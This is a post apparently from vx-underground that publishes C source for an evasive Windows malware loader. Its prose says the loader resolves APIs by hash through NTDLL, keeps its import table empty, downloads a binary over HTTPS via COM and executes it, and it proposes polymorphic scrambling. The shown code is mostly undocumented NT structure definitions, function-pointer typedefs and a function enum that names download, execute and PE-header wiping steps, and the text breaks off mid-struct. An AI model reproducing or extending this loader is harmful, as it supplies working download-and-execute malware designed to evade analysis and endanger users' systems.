# x64 WINAPI Recursive Loader
__"Code provided by smelly - vx-underground"__

Here is some code that was written about a year for a project for vx-underground. However, due to various reasons, the code is being publicly released.

tl;dr recursive loader, painful to reverse engineer

Explanation of code:
The following code is inspired by APT Linux/Kobalos. Kobalos was malware, suspected to be tied to the Chinese government, which was fully recursive. It was novel malware.

Following this inspiration, an x64 recursive loader was developed for Windows 10 and Windows 11. When compiled the binary has no entries in the IAT. The binary resolves all APIs via NTDLL. Additional libraries are loaded via LdrLoadDll.

The code recursively calls itself to execute functions. It determines which portion of code to execute using a flag (an enum). Each 'function' is encapsulated in a switch statement. All variables are recursively passed using the 'VARIABLE_TABLE' structure. The VARIABLE_TABLE also contains further nested structures for handling API function resolving, initializing COM objects and associated classes, and data structures for some 'switch functions' which may require additional variables for tasks.To avoid the compiler optimizing code and introducing functions into the IAT, some STDIO functionality such as ZeroMemory have been re-written in more unorthodox methods.

HTTPS requests are handled by COM via the WinHttpRequest Object.

The code basically downloads a binary from vx-underground and executes it. Currently the code will not work because the executable hosted on vx-underground for the proof-of-concept is no longer there – although it was just a copy cmd.exe.Code may have some bugs. It can be improved upon by introducing pseudo-polymorphism by 'scrambling' the order of switch statements and enum values on each build.

```
#include <Windows.h>
#include "httprequest.h"
#include <Netlistmgr.h>
#include <Wbemidl.h>

#pragma comment(lib, "wbemuuid.lib")

#pragma comment(linker, "/ENTRY:ApplicationEntryPoint")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#define STATUS_SUCCESS 0

#define AlignProcessParameters(X, Align) (((ULONG)(X)+(Align)-1UL)&(~((Align)-1UL)))
#define OBJ_HANDLE_TAGBITS 0x00000003L
#define RTL_USER_PROC_CURDIR_INHERIT 0x00000003
#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001
#define OBJ_CASE_INSENSITIVE 0x00000040
#define FILE_OVERWRITE_IF 0x00000005
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#define FILE_NON_DIRECTORY_FILE   0x00000040
#define FILE_OPEN_IF 0x00000003
#define FILE_OPEN 0x00000001


#define IOCTL_KSEC_RNG CTL_CODE(FILE_DEVICE_KSEC, 1, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}


typedef enum _SECTION_INHERIT
{
    ViewShare = 1,
    ViewUnmap = 2

} SECTION_INHERIT;

typedef struct _LSA_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;

typedef struct _LDR_MODULE {
    LIST_ENTRY              InLoadOrderModuleList;
    LIST_ENTRY              InMemoryOrderModuleList;
    LIST_ENTRY              InInitializationOrderModuleList;
    PVOID                   BaseAddress;
    PVOID                   EntryPoint;
    ULONG                   SizeOfImage;
    UNICODE_STRING          FullDllName;
    UNICODE_STRING          BaseDllName;
    ULONG                   Flags;
    SHORT                   LoadCount;
    SHORT                   TlsIndex;
    LIST_ENTRY              HashTableEntry;
    ULONG                   TimeDateStamp;
} LDR_MODULE, * PLDR_MODULE;

typedef struct _PEB_LDR_DATA {
    ULONG                   Length;
    ULONG                   Initialized;
    PVOID                   SsHandle;
    LIST_ENTRY              InLoadOrderModuleList;
    LIST_ENTRY              InMemoryOrderModuleList;
    LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR  Buffer;
} ANSI_STRING, * PANSI_STRING;

typedef struct _CURDIR {
    UNICODE_STRING DosPath;
    PVOID Handle;
}CURDIR, * PCURDIR;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
    WORD Flags;
    WORD Length;
    ULONG TimeStamp;
    ANSI_STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG MaximumLength;
    ULONG Length;
    ULONG Flags;
    ULONG DebugFlags;
    PVOID ConsoleHandle;
    ULONG ConsoleFlags;
    PVOID StandardInput;
    PVOID StandardOutput;
    PVOID StandardError;
    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;
    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;
    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
    ULONG EnvironmentSize;
    PVOID PackageDependencyData;
    ULONG ProcessGroupId;
    ULONG LoaderThreads;
    UNICODE_STRING RedirectionDllName;
    UNICODE_STRING HeapPartitionName;
    ULONGLONG* DefaultThreadpoolCpuSetMasks;
    ULONG DefaultThreadpoolCpuSetMaskCount;
    PVOID Alignment[4];
}RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BOOLEAN                 InheritedAddressSpace;
    BOOLEAN                 ReadImageFileExecOptions;
    BOOLEAN                 BeingDebugged;
    BOOLEAN                 Spare;
    HANDLE                  Mutant;
    PVOID                   ImageBase;
    PPEB_LDR_DATA           LoaderData;
    PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
    PVOID                   SubSystemData;
    PVOID                   ProcessHeap;
    PVOID                   FastPebLock;
    PVOID                   FastPebLockRoutine;
    PVOID                   FastPebUnlockRoutine;
    ULONG                   EnvironmentUpdateCount;
    PVOID* KernelCallbackTable;
    PVOID                   EventLogSection;
    PVOID                   EventLog;
    PVOID                   FreeList;
    ULONG                   TlsExpansionCounter;
    PVOID                   TlsBitmap;
    ULONG                   TlsBitmapBits[0x2];
    PVOID                   ReadOnlySharedMemoryBase;
    PVOID                   ReadOnlySharedMemoryHeap;
    PVOID* ReadOnlyStaticServerData;
    PVOID                   AnsiCodePageData;
    PVOID                   OemCodePageData;
    PVOID                   UnicodeCaseTableData;
    ULONG                   NumberOfProcessors;
    ULONG                   NtGlobalFlag;
    BYTE                    Spare2[0x4];
    LARGE_INTEGER           CriticalSectionTimeout;
    ULONG                   HeapSegmentReserve;
    ULONG                   HeapSegmentCommit;
    ULONG                   HeapDeCommitTotalFreeThreshold;
    ULONG                   HeapDeCommitFreeBlockThreshold;
    ULONG                   NumberOfHeaps;
    ULONG                   MaximumNumberOfHeaps;
    PVOID** ProcessHeaps;
    PVOID                   GdiSharedHandleTable;
    PVOID                   ProcessStarterHelper;
    PVOID                   GdiDCAttributeList;
    PVOID                   LoaderLock;
    ULONG                   OSMajorVersion;
    ULONG                   OSMinorVersion;
    ULONG                   OSBuildNumber;
    ULONG                   OSPlatformId;
    ULONG                   ImageSubSystem;
    ULONG                   ImageSubSystemMajorVersion;
    ULONG                   ImageSubSystemMinorVersion;
    ULONG                   GdiHandleBuffer[0x22];
    ULONG                   PostProcessInitRoutine;
    ULONG                   TlsExpansionBitmap;
    BYTE                    TlsExpansionBitmapBits[0x80];
    ULONG                   SessionId;
} PEB, * PPEB;

typedef struct __CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
}CLIENT_ID, * PCLIENT_ID;

typedef PVOID PACTIVATION_CONTEXT;

typedef struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME {
    struct __RTL_ACTIVATION_CONTEXT_STACK_FRAME* Previous;
    PACTIVATION_CONTEXT ActivationContext;
    ULONG Flags;
} RTL_ACTIVATION_CONTEXT_STACK_FRAME, * PRTL_ACTIVATION_CONTEXT_STACK_FRAME;

typedef struct _ACTIVATION_CONTEXT_STACK {
    PRTL_ACTIVATION_CONTEXT_STACK_FRAME ActiveFrame;
    LIST_ENTRY FrameListCache;
    ULONG Flags;
    ULONG NextCookieSequenceNumber;
    ULONG StackId;
} ACTIVATION_CONTEXT_STACK, * PACTIVATION_CONTEXT_STACK;

typedef struct _GDI_TEB_BATCH {
    ULONG Offset;
    ULONG HDC;
    ULONG Buffer[310];
} GDI_TEB_BATCH, * PGDI_TEB_BATCH;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT {
    ULONG Flags;
    PCHAR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, * PTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _TEB_ACTIVE_FRAME {
    ULONG Flags;
    struct _TEB_ACTIVE_FRAME* Previous;
    PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, * PTEB_ACTIVE_FRAME;

typedef struct _TEB
{
    NT_TIB                NtTib;
    PVOID                EnvironmentPointer;
    CLIENT_ID            ClientId;
    PVOID                ActiveRpcHandle;
    PVOID                ThreadLocalStoragePointer;
    PPEB                ProcessEnvironmentBlock;
    ULONG               LastErrorValue;
    ULONG               CountOfOwnedCriticalSections;
    PVOID                CsrClientThread;
    PVOID                Win32ThreadInfo;
    ULONG               User32Reserved[26];
    ULONG               UserReserved[5];
    PVOID                WOW32Reserved;
    LCID                CurrentLocale;
    ULONG               FpSoftwareStatusRegister;
    PVOID                SystemReserved1[54];
    LONG                ExceptionCode;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
    PACTIVATION_CONTEXT_STACK* ActivationContextStackPointer;
    UCHAR                  SpareBytes1[0x30 - 3 * sizeof(PVOID)];
    ULONG                  TxFsContext;
#elif (NTDDI_VERSION >= NTDDI_WS03)
    PACTIVATION_CONTEXT_STACK ActivationContextStackPointer;
    UCHAR                  SpareBytes1[0x34 - 3 * sizeof(PVOID)];
#else
    ACTIVATION_CONTEXT_STACK ActivationContextStack;
    UCHAR                  SpareBytes1[24];
#endif
    GDI_TEB_BATCH            GdiTebBatch;
    CLIENT_ID                RealClientId;
    PVOID                    GdiCachedProcessHandle;
    ULONG                   GdiClientPID;
    ULONG                   GdiClientTID;
    PVOID                    GdiThreadLocalInfo;
    PSIZE_T                    Win32ClientInfo[62];
    PVOID                    glDispatchTable[233];
    PSIZE_T                    glReserved1[29];
    PVOID                    glReserved2;
    PVOID                    glSectionInfo;
    PVOID                    glSection;
    PVOID                    glTable;
    PVOID                    glCurrentRC;
    PVOID                    glContext;
    NTSTATUS                LastStatusValue;
    UNICODE_STRING            StaticUnicodeString;
    WCHAR                   StaticUnicodeBuffer[261];
    PVOID                    DeallocationStack;
    PVOID                    TlsSlots[64];
    LIST_ENTRY                TlsLinks;
    PVOID                    Vdm;
    PVOID                    ReservedForNtRpc;
    PVOID                    DbgSsReserved[2];
#if (NTDDI_VERSION >= NTDDI_WS03)
    ULONG                   HardErrorMode;
#else
    ULONG                  HardErrorsAreDisabled;
#endif
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
    PVOID                    Instrumentation[13 - sizeof(GUID) / sizeof(PVOID)];
    GUID                    ActivityId;
    PVOID                    SubProcessTag;
    PVOID                    EtwLocalData;
    PVOID                    EtwTraceData;
#elif (NTDDI_VERSION >= NTDDI_WS03)
    PVOID                    Instrumentation[14];
    PVOID                    SubProcessTag;
    PVOID                    EtwLocalData;
#else
    PVOID                    Instrumentation[16];
#endif
    PVOID                    WinSockData;
    ULONG                    GdiBatchCount;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
    BOOLEAN                SpareBool0;
    BOOLEAN                SpareBool1;
    BOOLEAN                SpareBool2;
#else
    BOOLEAN                InDbgPrint;
    BOOLEAN                FreeStackOnTermination;
    BOOLEAN                HasFiberData;
#endif
    UCHAR                  IdealProcessor;
#if (NTDDI_VERSION >= NTDDI_WS03)
    ULONG                  GuaranteedStackBytes;
#else
    ULONG                  Spare3;
#endif
    PVOID                   ReservedForPerf;
    PVOID                   ReservedForOle;
    ULONG                  WaitingOnLoaderLock;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
    PVOID                   SavedPriorityState;
    ULONG_PTR               SoftPatchPtr1;
    ULONG_PTR               ThreadPoolData;
#elif (NTDDI_VERSION >= NTDDI_WS03)
    ULONG_PTR               SparePointer1;
    ULONG_PTR              SoftPatchPtr1;
    ULONG_PTR              SoftPatchPtr2;
#else
    Wx86ThreadState        Wx86Thread;
#endif
    PVOID* TlsExpansionSlots;
#if defined(_WIN64) && !defined(EXPLICIT_32BIT)
    PVOID                  DeallocationBStore;
    PVOID                  BStoreLimit;
#endif
    ULONG                  ImpersonationLocale;
    ULONG                  IsImpersonating;
    PVOID                  NlsCache;
    PVOID                  pShimData;
    ULONG                  HeapVirtualAffinity;
    HANDLE                 CurrentTransactionHandle;
    PTEB_ACTIVE_FRAME      ActiveFrame;
#if (NTDDI_VERSION >= NTDDI_WS03)
    PVOID FlsData;
#endif
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
    PVOID PreferredLangauges;
    PVOID UserPrefLanguages;
    PVOID MergedPrefLanguages;
    ULONG MuiImpersonation;
    union
    {
        struct
        {
            USHORT SpareCrossTebFlags : 16;
        };
        USHORT CrossTebFlags;
    };
    union
    {
        struct
        {
            USHORT DbgSafeThunkCall : 1;
            USHORT DbgInDebugPrint : 1;
            USHORT DbgHasFiberData : 1;
            USHORT DbgSkipThreadAttach : 1;
            USHORT DbgWerInShipAssertCode : 1;
            USHORT DbgIssuedInitialBp : 1;
            USHORT DbgClonedThread : 1;
            USHORT SpareSameTebBits : 9;
        };
        USHORT SameTebFlags;
    };
    PVOID TxnScopeEntercallback;
    PVOID TxnScopeExitCAllback;
    PVOID TxnScopeContext;
    ULONG LockCount;
    ULONG ProcessRundown;
    ULONG64 LastSwitchTime;
    ULONG64 TotalSwitchOutTime;
    LARGE_INTEGER WaitReasonBitMap;
#else
    BOOLEAN SafeThunkCall;
    BOOLEAN BooleanSpare[3];
#endif
} TEB, * PTEB;

typedef struct _KSYSTEM_TIME
{
    ULONG LowPart;
    LONG High1Time;
    LONG High2Time;
} KSYSTEM_TIME, * PKSYSTEM_TIME;

typedef enum _NT_PRODUCT_TYPE
{
    NtProductWinNt = 1,
    NtProductLanManNt = 2,
    NtProductServer = 3
} NT_PRODUCT_TYPE;

typedef enum _ALTERNATIVE_ARCHITECTURE_TYPE
{
    StandardDesign = 0,
    NEC98x86 = 1,
    EndAlternatives = 2
} ALTERNATIVE_ARCHITECTURE_TYPE;

typedef struct _KUSER_SHARED_DATA {
    ULONG                         TickCountLowDeprecated;
    ULONG                         TickCountMultiplier;
    KSYSTEM_TIME                  InterruptTime;
    KSYSTEM_TIME                  SystemTime;
    KSYSTEM_TIME                  TimeZoneBias;
    USHORT                        ImageNumberLow;
    USHORT                        ImageNumberHigh;
    WCHAR                         NtSystemRoot[260];
    ULONG                         MaxStackTraceDepth;
    ULONG                         CryptoExponent;
    ULONG                         TimeZoneId;
    ULONG                         LargePageMinimum;
    ULONG                         AitSamplingValue;
    ULONG                         AppCompatFlag;
    ULONGLONG                     RNGSeedVersion;
    ULONG                         GlobalValidationRunlevel;
    LONG                          TimeZoneBiasStamp;
    ULONG                         NtBuildNumber;
    NT_PRODUCT_TYPE               NtProductType;
    BOOLEAN                       ProductTypeIsValid;
    BOOLEAN                       Reserved0[1];
    USHORT                        NativeProcessorArchitecture;
    ULONG                         NtMajorVersion;
    ULONG                         NtMinorVersion;
    BOOLEAN                       ProcessorFeatures[64];
    ULONG                         Reserved1;
    ULONG                         Reserved3;
    ULONG                         TimeSlip;
    ALTERNATIVE_ARCHITECTURE_TYPE AlternativeArchitecture;
    ULONG                         BootId;
    LARGE_INTEGER                 SystemExpirationDate;
    ULONG                         SuiteMask;
    BOOLEAN                       KdDebuggerEnabled;
    union {
        UCHAR MitigationPolicies;
        struct {
            UCHAR NXSupportPolicy : 2;
            UCHAR SEHValidationPolicy : 2;
            UCHAR CurDirDevicesSkippedForDlls : 2;
            UCHAR Reserved : 2;
        };
    };
    USHORT                        CyclesPerYield;
    ULONG                         ActiveConsoleId;
    ULONG                         DismountCount;
    ULONG                         ComPlusPackage;
    ULONG                         LastSystemRITEventTickCount;
    ULONG                         NumberOfPhysicalPages;
    BOOLEAN                       SafeBootMode;
    UCHAR                         VirtualizationFlags;
    UCHAR                         Reserved12[2];
    union {
        ULONG SharedDataFlags;
        struct {
            ULONG DbgErrorPortPresent : 1;
            ULONG DbgElevationEnabled : 1;
            ULONG DbgVirtEnabled : 1;
            ULONG DbgInstallerDetectEnabled : 1;
            ULONG DbgLkgEnabled : 1;
            ULONG DbgDynProcessorEnabled : 1;
            ULONG DbgConsoleBrokerEnabled : 1;
            ULONG DbgSecureBootEnabled : 1;
            ULONG DbgMultiSessionSku : 1;
            ULONG DbgMultiUsersInSessionSku : 1;
            ULONG DbgStateSeparationEnabled : 1;
            ULONG SpareBits : 21;
        } DUMMYSTRUCTNAME2;
    } DUMMYUNIONNAME2;
    ULONG                         DataFlagsPad[1];
    ULONGLONG                     TestRetInstruction;
    LONGLONG                      QpcFrequency;
    ULONG                         SystemCall;
    ULONG                         Reserved2;
    ULONGLONG                     SystemCallPad[2];
    union {
        KSYSTEM_TIME TickCount;
        ULONG64      TickCountQuad;
        struct {
            ULONG ReservedTickCountOverlay[3];
            ULONG TickCountPad[1];
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME3;
    ULONG                         Cookie;
    ULONG                         CookiePad[1];
    LONGLONG                      ConsoleSessionForegroundProcessId;
    ULONGLONG                     TimeUpdateLock;
    ULONGLONG                     BaselineSystemTimeQpc;
    ULONGLONG                     BaselineInterruptTimeQpc;
    ULONGLONG                     QpcSystemTimeIncrement;
    ULONGLONG                     QpcInterruptTimeIncrement;
    UCHAR                         QpcSystemTimeIncrementShift;
    UCHAR                         QpcInterruptTimeIncrementShift;
    USHORT                        UnparkedProcessorCount;
    ULONG                         EnclaveFeatureMask[4];
    ULONG                         TelemetryCoverageRound;
    USHORT                        UserModeGlobalLogger[16];
    ULONG                         ImageFileExecutionOptions;
    ULONG                         LangGenerationCount;
    ULONGLONG                     Reserved4;
    ULONGLONG                     InterruptTimeBias;
    ULONGLONG                     QpcBias;
    ULONG                         ActiveProcessorCount;
    UCHAR                         ActiveGroupCount;
    UCHAR                         Reserved9;
    union {
        USHORT QpcData;
        struct {
            UCHAR QpcBypassEnabled;
            UCHAR QpcShift;
        };
    };
    LARGE_INTEGER                 TimeZoneBiasEffectiveStart;
    LARGE_INTEGER                 TimeZoneBiasEffectiveEnd;
    XSTATE_CONFIGURATION          XState;
    KSYSTEM_TIME                  FeatureConfigurationChangeStamp;
    ULONG                         Spare;
} KUSER_SHARED_DATA, * PKUSER_SHARED_DATA;

typedef enum _FILE_INFORMATION_CLASS {
    FileDirectoryInformation = 1,
    FileFullDirectoryInformation,                   // 2
    FileBothDirectoryInformation,                   // 3
    FileBasicInformation,                           // 4
    FileStandardInformation,                        // 5
    FileInternalInformation,                        // 6
    FileEaInformation,                              // 7
    FileAccessInformation,                          // 8
    FileNameInformation,                            // 9
    FileRenameInformation,                          // 10
    FileLinkInformation,                            // 11
    FileNamesInformation,                           // 12
    FileDispositionInformation,                     // 13
    FilePositionInformation,                        // 14
    FileFullEaInformation,                          // 15
    FileModeInformation,                            // 16
    FileAlignmentInformation,                       // 17
    FileAllInformation,                             // 18
    FileAllocationInformation,                      // 19
    FileEndOfFileInformation,                       // 20
    FileAlternateNameInformation,                   // 21
    FileStreamInformation,                          // 22
    FilePipeInformation,                            // 23
    FilePipeLocalInformation,                       // 24
    FilePipeRemoteInformation,                      // 25
    FileMailslotQueryInformation,                   // 26
    FileMailslotSetInformation,                     // 27
    FileCompressionInformation,                     // 28
    FileObjectIdInformation,                        // 29
    FileCompletionInformation,                      // 30
    FileMoveClusterInformation,                     // 31
    FileQuotaInformation,                           // 32
    FileReparsePointInformation,                    // 33
    FileNetworkOpenInformation,                     // 34
    FileAttributeTagInformation,                    // 35
    FileTrackingInformation,                        // 36
    FileIdBothDirectoryInformation,                 // 37
    FileIdFullDirectoryInformation,                 // 38
    FileValidDataLengthInformation,                 // 39
    FileShortNameInformation,                       // 40
    FileIoCompletionNotificationInformation,        // 41
    FileIoStatusBlockRangeInformation,              // 42
    FileIoPriorityHintInformation,                  // 43
    FileSfioReserveInformation,                     // 44
    FileSfioVolumeInformation,                      // 45
    FileHardLinkInformation,                        // 46
    FileProcessIdsUsingFileInformation,             // 47
    FileNormalizedNameInformation,                  // 48
    FileNetworkPhysicalNameInformation,             // 49
    FileIdGlobalTxDirectoryInformation,             // 50
    FileIsRemoteDeviceInformation,                  // 51
    FileUnusedInformation,                          // 52
    FileNumaNodeInformation,                        // 53
    FileStandardLinkInformation,                    // 54
    FileRemoteProtocolInformation,                  // 55
    FileRenameInformationBypassAccessCheck,         // 56
    FileLinkInformationBypassAccessCheck,           // 57
    FileVolumeNameInformation,                      // 58
    FileIdInformation,                              // 59
    FileIdExtdDirectoryInformation,                 // 60
    FileReplaceCompletionInformation,               // 61
    FileHardLinkFullIdInformation,                  // 62
    FileIdExtdBothDirectoryInformation,             // 63
    FileDispositionInformationEx,                   // 64
    FileRenameInformationEx,                        // 65
    FileRenameInformationExBypassAccessCheck,       // 66
    FileDesiredStorageClassInformation,             // 67
    FileStatInformation,                            // 68
    FileMemoryPartitionInformation,                 // 69
    FileStatLxInformation,                          // 70
    FileCaseSensitiveInformation,                   // 71
    FileLinkInformationEx,                          // 72
    FileLinkInformationExBypassAccessCheck,         // 73
    FileStorageReserveIdInformation,                // 74
    FileCaseSensitiveInformationForceAccessCheck,   // 75
    FileMaximumInformation
} FILE_INFORMATION_CLASS, * PFILE_INFORMATION_CLASS;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID    Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    PVOID RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _RTLP_CURDIR_REF* PRTLP_CURDIR_REF;

typedef struct _RTL_RELATIVE_NAME_U {
    UNICODE_STRING RelativeName;
    HANDLE ContainingDirectory;
    PRTLP_CURDIR_REF CurDirRef;
} RTL_RELATIVE_NAME_U, * PRTL_RELATIVE_NAME_U;

#define PS_ATTRIBUTE_NUMBER_MASK    0x0000ffff
#define PS_ATTRIBUTE_THREAD         0x00010000
#define PS_ATTRIBUTE_INPUT          0x00020000
#define PS_ATTRIBUTE_ADDITIVE       0x00040000

typedef enum _PS_ATTRIBUTE_NUM
{
    PsAttributeParentProcess,
    PsAttributeDebugPort,
    PsAttributeToken,
    PsAttributeClientId,
    PsAttributeTebAddress,
    PsAttributeImageName,
    PsAttributeImageInfo,
    PsAttributeMemoryReserve,
    PsAttributePriorityClass,
    PsAttributeErrorMode,
    PsAttributeStdHandleInfo,
    PsAttributeHandleList,
    PsAttributeGroupAffinity,
    PsAttributePreferredNode,
    PsAttributeIdealProcessor,
    PsAttributeUmsThread,
    PsAttributeMitigationOptions,
    PsAttributeProtectionLevel,
    PsAttributeSecureProcess,
    PsAttributeJobList,
    PsAttributeChildProcessPolicy,
    PsAttributeAllApplicationPackagesPolicy,
    PsAttributeWin32kFilter,
    PsAttributeSafeOpenPromptOriginClaim,
    PsAttributeBnoIsolation,
    PsAttributeDesktopAppPolicy,
    PsAttributeMax
} PS_ATTRIBUTE_NUM;

#define PsAttributeValue(Number, Thread, Input, Additive) \
    (((Number) & PS_ATTRIBUTE_NUMBER_MASK) | \
    ((Thread) ? PS_ATTRIBUTE_THREAD : 0) | \
    ((Input) ? PS_ATTRIBUTE_INPUT : 0) | \
    ((Additive) ? PS_ATTRIBUTE_ADDITIVE : 0))

#define RTL_USER_PROCESS_PARAMETERS_NORMALIZED              0x01
#define PS_ATTRIBUTE_IMAGE_NAME \
    PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE)

typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[2];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef enum _PS_CREATE_STATE
{
    PsCreateInitialState,
    PsCreateFailOnFileOpen,
    PsCreateFailOnSectionCreate,
    PsCreateFailExeFormat,
    PsCreateFailMachineMismatch,
    PsCreateFailExeName,
    PsCreateSuccess,
    PsCreateMaximumStates
} PS_CREATE_STATE;

typedef struct _PS_CREATE_INFO {
    SIZE_T Size;
    PS_CREATE_STATE State;
    union {
        struct {
            union {
                ULONG InitFlags;
                struct {
                    UCHAR WriteOutputOnExit : 1;
                    UCHAR DetectManifest : 1;
                    UCHAR IFEOSkipDebugger : 1;
                    UCHAR IFEODoNotPropagateKeyState : 1;
                    UCHAR SpareBits1 : 4;
                    UCHAR SpareBits2 : 8;
                    USHORT ProhibitedImageCharacteristics : 16;
                } s1;
            } u1;
            ACCESS_MASK AdditionalFileAccess;
        } InitState;
        struct { HANDLE FileHandle; } FailSection;
        struct { USHORT DllCharacteristics; } ExeFormat;
        struct { HANDLE IFEOKey; } ExeName;
        struct {
            union {
                ULONG OutputFlags;
                struct {
                    UCHAR ProtectedProcess : 1;
                    UCHAR AddressSpaceOverride : 1;
                    UCHAR DevOverrideEnabled : 1;
                    UCHAR ManifestDetected : 1;
                    UCHAR ProtectedProcessLight : 1;
                    UCHAR SpareBits1 : 3;
                    UCHAR SpareBits2 : 8;
                    USHORT SpareBits3 : 16;
                } s2;
            } u2;
            HANDLE FileHandle;
            HANDLE SectionHandle;
            ULONGLONG UserProcessParametersNative;
            ULONG UserProcessParametersWow64;
            ULONG CurrentParameterFlags;
            ULONGLONG PebAddressNative;
            ULONG PebAddressWow64;
            ULONGLONG ManifestAddress;
            ULONG ManifestSize;
        } SuccessState;
    };
} PS_CREATE_INFO, * PPS_CREATE_INFO;

typedef NTSTATUS(NTAPI* NTCREATEUSERPROCESS)(PHANDLE, PHANDLE, ACCESS_MASK, ACCESS_MASK, POBJECT_ATTRIBUTES, POBJECT_ATTRIBUTES, ULONG, ULONG, PRTL_USER_PROCESS_PARAMETERS, PPS_CREATE_INFO, PPS_ATTRIBUTE_LIST);
typedef NTSTATUS(NTAPI* LDRLOADDLL)(PWSTR, PULONG, PUNICODE_STRING, PVOID);
typedef NTSTATUS(NTAPI* NTCREATEFILE)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI* NTCLOSE)(HANDLE);
typedef NTSTATUS(NTAPI* NTWRITEFILE)(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
typedef NTSTATUS(NTAPI* NTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NTFREEVIRTUALMEMORY)(HANDLE, PVOID, PSIZE_T, ULONG);
typedef NTSTATUS(NTAPI* NTDEVICEIOCONTROLFILE)(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI* NTTERMINATEPROCESS)(HANDLE, ULONG);


typedef HRESULT(WINAPI* COINITIALIZEEX)(LPVOID, DWORD);
typedef VOID(WINAPI* COUNINITIALIZE)(VOID);
typedef HRESULT(WINAPI* COCREATEINSTANCE)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
typedef HRESULT(WINAPI* COINITIALIZESECURITY)(PSECURITY_DESCRIPTOR, LONG, PSOLE_AUTHENTICATION_SERVICE, PVOID, DWORD, DWORD, PVOID, DWORD, PVOID);

typedef VOID(WINAPI* SYSFREESTRING)(BSTR);

typedef enum SWITCH_FUNCTIONS {
    EntryPoint,                                //0
    GetGeneralInformation,                    //1
    GetNtdllBaseAddress,                    //2
    ExitApplication,                        //3
    HashStringFowlerNollVoVariant1aW,        //4
    GetProcAddressByHash,                    //5
    RtlLoadPeHeaders,                        //6
    CharStringToWCharString,                //7
    StringLength,                            //8
    ExecuteBinary,                            //9
    PopulateNtFunctionPointers,                //10
    CreateProcessParameters,                //11
    CopyParameters,                            //12
    QueryEnvironmentVariables,                //13
    NullPeHeaders,                            //14
    CreateDownloadPath,                        //15
    PopulateComFunctionPointers,            //16
    GetTickCountAsDword,                    //17
    DownloadBinary,                            //18
    LoadComLibraries,                        //19
    GetSysFreeString,                        //20
    UnloadDll,                                //21
    RemoveListEntry,                        //22
    RemoveComData,                            //23
    CheckRemoteHost,                        //24
    SafelyExitCom,                            //25
    CheckLocalMachinesInternetStatus,        //26
    ZeroFillData,                            //27
    Win32FromHResult                        //28
}SWITCH_FUNCTIONS, *PSWITCH_FUNCTIONS;

typedef struct _COPY_PARAMETERS {
    PWSTR d;
    PUNICODE_STRING Destination;
    PUNICODE_STRING Source;
    ULONG Size;
